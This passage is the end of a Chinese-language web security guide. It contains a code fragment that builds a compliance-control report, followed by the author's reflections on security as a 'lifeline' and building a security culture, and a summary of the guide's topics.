              (frameworkControls.filter(c => c.status === 'IMPLEMENTED').length /
              frameworkControls.length) * 100
            )
          : 0
      },
      controls: frameworkControls.map(c => ({
        id: c.id,
        title: c.title,
        status: c.status,
        lastReview: c.lastReview,
        nextReview: c.nextReview
      })),
      gaps: frameworkControls
        .filter(c => c.status !== 'IMPLEMENTED')
        .map(c => ({
          control: c.title,
          currentStatus: c.status,
          recommendation: c.description
        }))
    };

    return report;
  }
}
```

### 12.5 我的思考：安全是生命线

在多年的安全工作中，我深刻体会到安全对于现代Web应用的重要性。安全不仅是技术问题，更是关乎企业生存和用户信任的根本问题。

**安全是生命线的体现：**

1. **用户信任的基石**：用户将自己的数据和隐私托付给平台，一旦发生数据泄露，不仅用户受到伤害，平台的信誉也将遭受难以挽回的损失。

2. **法律责任的底线**：随着GDPR、PIPL等隐私法规的实施，企业对用户数据的保护有了法律义务。违规可能面临巨额罚款，甚至刑事责任。

3. **业务连续性的保障**：安全事件可能导致系统停机、服务中断，直接影响业务运营和收入。

4. **竞争优势的体现**：在同质化竞争中，安全能力可以成为差异化竞争优势。

**安全运营的关键要点：**

1. **预防为主**：通过安全设计、安全编码、安全测试等手段，在开发阶段就消除大部分安全隐患。

2. **检测为王**：即使最好的防护也可能被突破，需要强大的检测能力来及时发现问题。

3. **快速响应**：当安全事件发生时，快速、有效的响应可以最大程度减少损失。

4. **持续改进**：安全是一个持续的过程，需要不断学习新的威胁，更新防护措施。

5. **全员参与**：安全不仅是安全团队的责任，每个开发人员、运维人员甚至普通员工都与安全息息相关。

**建立安全文化的建议：**

1. **将安全纳入开发流程**：在需求设计、编码、测试、部署的每个阶段都融入安全考虑。

2. **定期安全培训**：确保所有相关人员了解最新的安全威胁和防护方法。

3. **激励安全行为**：对发现并报告安全问题的员工给予奖励，营造全员参与安全的氛围。

4. **透明沟通**：当安全事件发生时，及时、透明地与用户和利益相关方沟通。

5. **持续投资**：安全是需要长期投入的领域，不能期望一劳永逸的解决方案。

---

## 总结

本文档系统性地介绍了Web安全的核心知识点，从常见的Web攻击类型（XSS、CSRF、SQL注入）到安全防护策略（密码安全、JWT安全、OAuth安全），从接口安全到前端安全，从敏感数据保护到安全运营，形成了一个完整的安全知识体系。

作为全栈开发者，掌握这些安全知识不仅是职业要求，更是对用户负责的体现。希望本文档能够帮助读者建立系统的安全思维，在实际开发中能够识别和防范潜在的安全风险，构建出真正安全可靠的Web应用。

记住：**安全不是可选项，而是生命线**。只有在思想上的高度重视，才能在行动中的万无一失。
